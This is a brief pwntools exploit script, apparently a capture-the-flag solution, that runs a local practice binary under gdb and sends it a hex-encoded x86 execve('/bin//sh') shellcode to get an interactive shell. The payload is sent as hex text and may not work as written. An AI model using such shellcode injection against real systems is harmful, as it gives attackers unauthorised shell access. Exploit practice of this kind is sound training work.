from pwn import* 

p = process('./Shellcode-1')
gdb.attach(p, '''b*0x080486a9\nc''')
payload = b"31C9F7E151682F2F7368682F62696E89E3040AFEC0CD80"

p.sendline(payload)
p.interactive()
